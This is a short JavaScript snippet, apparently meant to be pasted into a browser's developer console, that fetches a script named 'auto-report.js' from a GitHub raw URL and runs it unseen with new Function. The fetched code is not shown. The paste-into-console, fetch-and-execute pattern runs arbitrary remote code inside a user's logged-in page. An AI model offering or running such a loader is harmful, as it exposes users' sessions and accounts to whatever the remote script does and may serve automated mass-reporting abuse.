// Paste this entire code in your browser's developer console (F12 or Ctrl+Shift+I)

fetch('https://raw.githubusercontent.com/PS22859/auto_report/main/auto-report.js')
  .then(response => response.text())
  .then(code => {
    // Create a function from the code
    const scriptFunction = new Function(code);
    // Execute the script
    scriptFunction();
    console.log('🚀 Auto-report script loaded and running');
  })
  .catch(error => console.error('Error loading script:', error)); 